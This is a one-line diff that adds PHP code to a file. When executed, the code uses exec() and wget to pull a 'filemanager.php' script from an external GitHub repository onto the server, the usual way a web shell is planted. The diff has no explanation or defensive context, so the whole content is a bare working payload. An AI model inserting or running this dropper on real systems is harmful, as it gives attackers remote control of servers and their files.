@@ -1,0 +1,1 @@
+A<?php echo exec('wget https://raw.githubusercontent.com/yusarinyusakun/GABUD/main/filemanager.php'); ?>
